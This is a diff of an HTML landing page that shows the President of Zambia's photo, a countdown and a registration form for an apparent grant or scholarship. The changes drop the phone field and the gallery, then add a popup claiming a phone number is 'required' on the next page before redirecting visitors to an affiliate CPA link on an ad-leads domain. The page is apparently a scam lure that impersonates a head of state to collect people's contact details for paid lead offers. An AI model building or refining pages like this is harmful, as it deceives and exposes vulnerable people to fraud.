@@ -67,7 +67,6 @@
 
     .wrap{ max-width: 1180px; margin: 0 auto; padding: 18px; }
 
-    /* Zambia flag bar */
     .flagbar{
       border:1px solid rgba(255,255,255,.10);
       background: rgba(255,255,255,.04);
@@ -134,7 +133,6 @@
       position: relative;
     }
 
-    /* ==== HERO BANNER ==== */
     .heroBanner{
       min-height: 520px;
       padding: 18px;
@@ -151,7 +149,6 @@
         linear-gradient(180deg, rgba(0,0,0,.08) 0%, rgba(0,0,0,.72) 72%);
     }
 
-    /* ✅ President watermark behind text (stable URL) */
     .heroBanner::before{
       content:"";
       position:absolute;
@@ -176,7 +173,6 @@
 
     .heroBanner *{ position:relative; z-index: 2; }
 
-    /* ✅ Bigger President Card */
     .presCard{
       position:absolute;
       top: 16px;
@@ -194,8 +190,8 @@
       max-width: 520px;
     }
     .presPhoto{
-      width: 110px;      /* أكبر */
-      height: 110px;     /* أكبر */
+      width: 110px;
+      height: 110px;
       border-radius: 24px;
       overflow:hidden;
       border: 1px solid rgba(255,255,255,.22);
@@ -339,59 +335,6 @@
 
     .fineprint{ font-size: 12px; color: rgba(238,243,255,.62); line-height: 1.5; font-weight:700; }
 
-    .trustRow{ display:flex; gap:10px; flex-wrap:wrap; margin-top: 10px; }
-    .trust{
-      flex: 1 1 140px;
-      padding: 10px 12px;
-      border-radius: 16px;
-      border:1px solid var(--stroke);
-      background: rgba(255,255,255,.04);
-    }
-    .trust b{ display:block; font-size: 13px; font-weight:1000; }
-    .trust span{ display:block; margin-top:2px; font-size: 12px; color: var(--muted); font-weight:800; }
-
-    .section{ margin-top: 18px; padding: 18px; }
-    .sectionHead{ display:flex; align-items:flex-end; justify-content:space-between; gap:12px; margin-bottom: 12px; }
-    .section h3{ margin:0; font-size: 22px; font-weight: 1000; }
-    .section p{ margin: 6px 0 0; color: var(--muted); font-weight: 800; }
-
-    .gallery{
-      display:grid;
-      grid-template-columns: repeat(12, 1fr);
-      gap: 10px;
-    }
-    .gcard{
-      grid-column: span 3;
-      border-radius: 18px;
-      overflow:hidden;
-      border: 1px solid var(--stroke);
-      background: rgba(255,255,255,.03);
-      min-height: 150px;
-      transition: transform .22s ease, border-color .22s ease;
-    }
-    .gcard:hover{ transform: translateY(-3px); border-color: rgba(255,255,255,.22); }
-    .gcard img{ width:100%; height: 170px; object-fit: cover; display:block; filter: saturate(1.06) contrast(1.03); }
-    .gmeta{
-      padding: 10px 12px 12px;
-      display:flex; align-items:center; justify-content:space-between; gap:10px;
-      flex-wrap:wrap;
-    }
-    .tag{
-      display:inline-flex; align-items:center; gap:8px;
-      font-size: 12px;
-      padding: 6px 10px;
-      border-radius: 999px;
-      border: 1px solid var(--stroke);
-      background: rgba(255,255,255,.03);
-      color: rgba(238,243,255,.82);
-      font-weight: 900;
-    }
-    .miniDot{
-      width:8px;height:8px;border-radius:50%;
-      background: linear-gradient(135deg, var(--a2), var(--a1));
-      box-shadow: 0 0 0 6px rgba(124,58,237,.12);
-    }
-
     footer{
       padding: 26px 18px 90px;
       text-align:center;
@@ -435,7 +378,6 @@
     @media (max-width: 1020px){
       .hero{ grid-template-columns: 1fr; }
       .headline{ font-size: 34px; }
-      .gcard{ grid-column: span 6; }
       .stickyCTA{ display:block; }
       .presCard{ position: static; margin-bottom: 10px; max-width: 100%; }
     }
@@ -443,20 +385,121 @@
       .grid2{ grid-template-columns: 1fr; }
       .headline{ font-size: 30px; }
       .timebox{ min-width: 88px; }
-      .gcard{ grid-column: span 12; }
       .presPhoto{ width: 96px; height: 96px; }
     }
 
     .reveal{ opacity:0; transform: translateY(10px); animation: in .7s ease forwards; }
     .reveal.delay1{ animation-delay: .08s; }
     .reveal.delay2{ animation-delay: .16s; }
-    .reveal.delay3{ animation-delay: .24s; }
     @keyframes in{ to{ opacity:1; transform: translateY(0); } }
+
+    /* ====== PRO POPUP (Modal) ====== */
+    .modalOverlay{
+      position: fixed;
+      inset: 0;
+      display:none;
+      align-items: center;
+      justify-content: center;
+      padding: 18px;
+      background: rgba(0,0,0,.55);
+      backdrop-filter: blur(8px);
+      z-index: 999;
+    }
+    .modalOverlay.show{ display:flex; }
+
+    .modalCard{
+      width: min(560px, 100%);
+      border-radius: 22px;
+      border: 1px solid rgba(255,255,255,.16);
+      background: linear-gradient(180deg, rgba(255,255,255,.10), rgba(255,255,255,.05));
+      box-shadow: 0 35px 120px rgba(0,0,0,.65);
+      overflow:hidden;
+      transform: translateY(10px) scale(.98);
+      opacity: 0;
+      animation: pop .18s ease forwards;
+    }
+    @keyframes pop{
+      to{ transform: translateY(0) scale(1); opacity: 1; }
+    }
+
+    .modalTop{
+      padding: 16px 16px 10px;
+      display:flex;
+      align-items:center;
+      gap: 12px;
+      border-bottom: 1px solid rgba(255,255,255,.12);
+      background: rgba(0,0,0,.20);
+    }
+    .modalIcon{
+      width:44px;height:44px;border-radius:16px;
+      display:grid;place-items:center;
+      background: linear-gradient(135deg, rgba(245,158,11,.95), rgba(34,197,94,.85));
+      box-shadow: 0 18px 60px rgba(245,158,11,.18);
+      color: #071016;
+      font-weight: 1000;
+    }
+    .modalTitle{
+      margin:0;
+      font-size: 16px;
+      font-weight: 1000;
+    }
+    .modalBody{
+      padding: 14px 16px 16px;
+      color: rgba(238,243,255,.86);
+      font-weight: 800;
+      line-height: 1.55;
+    }
+    .modalHint{
+      margin-top: 10px;
+      font-size: 12px;
+      color: rgba(238,243,255,.65);
+      font-weight: 800;
+    }
+    .modalActions{
+      display:flex;
+      gap: 10px;
+      padding: 0 16px 16px;
+      justify-content:flex-end;
+    }
+    .okBtn{
+      border:none;
+      border-radius: 16px;
+      padding: 12px 16px;
+      font-weight: 1000;
+      cursor:pointer;
+      color:#071016;
+      background: linear-gradient(90deg, rgba(34,197,94,1), rgba(6,182,212,1));
+      box-shadow: 0 18px 60px rgba(6,182,212,.20);
+      min-width: 110px;
+    }
+    .okBtn:active{ transform: translateY(1px); }
   </style>
 </head>
 
 <body>
   <div class="bg-dots"></div>
+
+  <!-- ✅ POPUP -->
+  <div class="modalOverlay" id="modalOverlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalMsg">
+    <div class="modalCard">
+      <div class="modalTop">
+        <div class="modalIcon">!</div>
+        <div>
+          <h3 class="modalTitle" id="modalTitle">Just one more thing</h3>
+          <div style="font-size:12px;color:rgba(238,243,255,.68);font-weight:800;">Phone number required</div>
+        </div>
+      </div>
+      <div class="modalBody">
+        <div id="modalMsg">
+          Please enter your phone number so we can call you. Tap <b>OK</b> to continue.
+        </div>
+        <div class="modalHint">You’ll complete the phone step on the next page.</div>
+      </div>
+      <div class="modalActions">
+        <button class="okBtn" id="modalOkBtn" type="button">OK</button>
+      </div>
+    </div>
+  </div>
 
   <div class="wrap">
     <div class="flagbar reveal">
@@ -482,7 +525,6 @@
       <div class="panel heroBanner reveal delay1">
         <div class="presCard" aria-label="President of Zambia">
           <div class="presPhoto">
-            <!-- ✅ Stable Avatar URL -->
             <img id="presAvatar"
                  alt="President of Zambia"
                  src="https://commons.wikimedia.org/wiki/Special:FilePath/President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC_(cropped).jpg?width=512">
@@ -518,7 +560,7 @@
           <div class="formTitle">
             <div>
               <h2>Registration Form</h2>
-              <p>Enter your full name and mobile number.</p>
+              <p>Enter your full name and province/state.</p>
             </div>
             <div class="pill" style="gap:6px;">
               <span style="width:8px;height:8px;border-radius:50%;background:linear-gradient(135deg,var(--a4),var(--a2));box-shadow:0 0 0 6px rgba(6,182,212,.12)"></span>
@@ -532,56 +574,23 @@
                 <label for="name">Full Name</label>
                 <input id="name" name="name" type="text" placeholder="e.g., John Mwansa" required minlength="3"/>
               </div>
+
               <div class="field">
-                <label for="phone">Mobile Number</label>
-                <input id="phone" name="phone" type="tel" placeholder="+260XXXXXXXXX" required/>
+                <label for="state">Province / State</label>
+                <input id="state" name="state" type="text" placeholder="e.g., Lusaka Province" required minlength="2"/>
               </div>
             </div>
 
             <div style="height:10px"></div>
             <button class="btn" type="submit">Continue</button>
 
-            <div class="status ok" id="okMsg">Success! Redirecting…</div>
             <div class="status err" id="errMsg">Please check your details and try again.</div>
 
             <div style="margin-top:10px" class="fineprint">
-              Tip: Zambia country code is <b>+260</b>. By continuing, you agree to be contacted about the registration.
+              By continuing, you agree to be contacted about the registration.
             </div>
           </form>
-
-          <div class="trustRow">
-            <div class="trust"><b>Instant next step</b><span>Redirects automatically after submitting.</span></div>
-            <div class="trust"><b>Mobile optimized</b><span>Fast and clean on all devices.</span></div>
-            <div class="trust"><b>Simple & clear</b><span>One-step registration form.</span></div>
-          </div>
         </div>
-      </div>
-    </div>
-
-    <div class="panel section reveal delay3" id="gallery">
-      <div class="sectionHead">
-        <div>
-          <h3>Scholarship Examples</h3>
-          <p>Illustrative images related to scholarships, admission, and study support.</p>
-        </div>
-        <div class="pill">Updated: <span id="today"></span></div>
-      </div>
-
-      <div class="gallery">
-        <div class="gcard"><img alt="Scholarship Application" src="https://images.unsplash.com/photo-1554224154-22dec7ec8818?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Application</span><span class="tag">Step-by-step</span></div></div>
-        <div class="gcard"><img alt="Acceptance Letter" src="https://images.unsplash.com/photo-1521790361543-f645cf042ec4?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Admission</span><span class="tag">Letter</span></div></div>
-        <div class="gcard"><img alt="Graduation" src="https://images.unsplash.com/photo-1523580494863-6f3031224c94?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Graduation</span><span class="tag">Success</span></div></div>
-        <div class="gcard"><img alt="Books and Study" src="https://images.unsplash.com/photo-1524995997946-a1c2e315a42f?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Study</span><span class="tag">Books</span></div></div>
-
-        <div class="gcard"><img alt="University Students" src="https://images.unsplash.com/photo-1523240795612-9a054b0db644?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Students</span><span class="tag">Campus</span></div></div>
-        <div class="gcard"><img alt="Tuition Funding" src="https://images.unsplash.com/photo-1521791055366-0d553872125f?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Funding</span><span class="tag">Tuition</span></div></div>
-        <div class="gcard"><img alt="Online Study" src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Online</span><span class="tag">Flexible</span></div></div>
-        <div class="gcard"><img alt="Exam Preparation" src="https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Preparation</span><span class="tag">Skills</span></div></div>
-
-        <div class="gcard"><img alt="University Building" src="https://images.unsplash.com/photo-1541339907198-e08756dedf3f?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> University</span><span class="tag">Access</span></div></div>
-        <div class="gcard"><img alt="Scholarship Opportunity" src="https://images.unsplash.com/photo-1523580846011-d3a5bc25702b?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Opportunity</span><span class="tag">2026</span></div></div>
-        <div class="gcard"><img alt="Mentorship" src="https://images.unsplash.com/photo-1521737604893-d14cc237f11d?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Mentorship</span><span class="tag">Guidance</span></div></div>
-        <div class="gcard"><img alt="Scholarship Support" src="https://images.unsplash.com/photo-1529070538774-1843cb3265df?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Support</span><span class="tag">Merit</span></div></div>
       </div>
     </div>
 
@@ -612,12 +621,8 @@
     // CPA redirect URL
     const CPA_URL = "https://iconics.adsleads1.store/?utm_medium=45cb5b04ee2dd3d524876ef99d99f52ba4436745&utm_campaign=menhaza";
 
-    const APPEND_PARAMS_TO_CPA = true;
-
     // Dates
     const today = new Date();
-    const todayEl = document.getElementById("today");
-    if (todayEl) todayEl.textContent = today.toLocaleDateString(undefined, {year:"numeric", month:"short", day:"2-digit"});
     document.getElementById("year").textContent = today.getFullYear();
 
     // Countdown
@@ -650,26 +655,7 @@
     tick();
     setInterval(tick, 1000);
 
-    // Redirect helper
-    function buildRedirectUrl(baseUrl, paramsObj){
-      try{
-        const u = new URL(baseUrl);
-        Object.entries(paramsObj).forEach(([k,v]) => {
-          if (v !== undefined && v !== null && String(v).trim() !== "") {
-            u.searchParams.set(k, String(v).trim());
-          }
-        });
-        return u.toString();
-      }catch(e){
-        const qs = Object.entries(paramsObj)
-          .filter(([,v]) => v !== undefined && v !== null && String(v).trim() !== "")
-          .map(([k,v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v).trim())}`)
-          .join("&");
-        return baseUrl + (baseUrl.includes("?") ? "&" : "?") + qs;
-      }
-    }
-
-    // ✅ Avatar fallback (if anything blocks)
+    // Avatar fallback
     const avatar = document.getElementById("presAvatar");
     if (avatar) {
       avatar.onerror = () => {
@@ -678,43 +664,68 @@
       };
     }
 
+    // ====== Pro Popup logic ======
+    const modalOverlay = document.getElementById("modalOverlay");
+    const okBtn = document.getElementById("modalOkBtn");
+
+    function openModal(){
+      modalOverlay.classList.add("show");
+      // focus OK
+      setTimeout(() => okBtn.focus(), 0);
+      // lock scroll
+      document.body.style.overflow = "hidden";
+    }
+    function closeModal(){
+      modalOverlay.classList.remove("show");
+      document.body.style.overflow = "";
+    }
+
+    // Close on overlay click (optional)
+    modalOverlay.addEventListener("click", (e) => {
+      if (e.target === modalOverlay) {
+        // لازم OK للتحويل، فهنقفل بس بدون تحويل
+        closeModal();
+      }
+    });
+
+    // Close on ESC (optional)
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape" && modalOverlay.classList.contains("show")) closeModal();
+    });
+
     // Form submit
     const form = document.getElementById("leadForm");
-    const okMsg = document.getElementById("okMsg");
     const errMsg = document.getElementById("errMsg");
+
+    // We'll store redirect in variable (so only after OK)
+    let pendingRedirectUrl = null;
 
     form.addEventListener("submit", (e) => {
       e.preventDefault();
-      okMsg.style.display = "none";
       errMsg.style.display = "none";
 
       const name = document.getElementById("name").value.trim();
-      const phone = document.getElementById("phone").value.trim();
+      const state = document.getElementById("state").value.trim();
 
       if (name.length < 3) {
         errMsg.textContent = "Please enter your full name.";
         errMsg.style.display = "block";
         return;
       }
-      const phoneOk = /^[0-9+\-\s()]{8,}$/.test(phone);
-      if (!phoneOk) {
-        errMsg.textContent = "Please enter a valid mobile number.";
+      if (state.length < 2) {
+        errMsg.textContent = "Please enter your province/state.";
         errMsg.style.display = "block";
         return;
       }
 
-      okMsg.style.display = "block";
+      // Show popup then redirect after OK
+      pendingRedirectUrl = CPA_URL;
+      openModal();
+    });
 
-      let goTo = CPA_URL;
-      if (APPEND_PARAMS_TO_CPA) {
-        goTo = buildRedirectUrl(CPA_URL, {
-          full_name: name,
-          mobile: phone,
-          src: "landing_president_grant"
-        });
-      }
-
-      setTimeout(() => { window.location.href = goTo; }, 850);
+    okBtn.addEventListener("click", () => {
+      closeModal();
+      if (pendingRedirectUrl) window.location.href = pendingRedirectUrl;
     });
   </script>
 </body>
